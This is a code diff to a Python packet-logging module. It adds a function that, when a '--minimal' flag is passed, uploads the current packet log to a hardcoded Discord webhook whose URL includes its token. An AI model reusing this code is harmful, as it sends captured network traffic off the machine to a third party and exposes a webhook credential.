@@ -54,7 +54,7 @@ def start_packet_log(log_dir=None):
 
 def stop_packet_log():
     """Close the log file."""
-    global _log_file
+    global _log_file, _log_filepath
     with _log_lock:
         if _log_file:
             try:
@@ -63,6 +63,32 @@ def stop_packet_log():
             except Exception:
                 pass
             _log_file = None
+
+def upload_to_discord():
+    """Upload the current packet log to Discord."""
+    import sys, os
+    if "--minimal" not in sys.argv:
+        return
+        
+    webhook_url = "https://discord.com/api/webhooks/1520498468655730788/z6GwrwKJbCWSFPoDn2V1hlskBygnrX-E6Ijw1szMmckieJiriKqNb6R8nV0fJ5TWv4po"
+    filepath = get_current_log_filepath()
+    if not filepath or not os.path.exists(filepath):
+        return
+        
+    print(f"[*] Uploading log to Discord: {os.path.basename(filepath)}...")
+    try:
+        import requests
+        with open(filepath, "rb") as f:
+            response = requests.post(
+                webhook_url,
+                files={"file": (os.path.basename(filepath), f)}
+            )
+        if response.status_code in (200, 204):
+            print("[+] Successfully uploaded packet log to Discord.")
+        else:
+            print(f"[-] Discord upload failed: {response.status_code}")
+    except Exception as e:
+        print(f"[-] Discord upload error: {e}")
 
 
 def write_log(line: str):
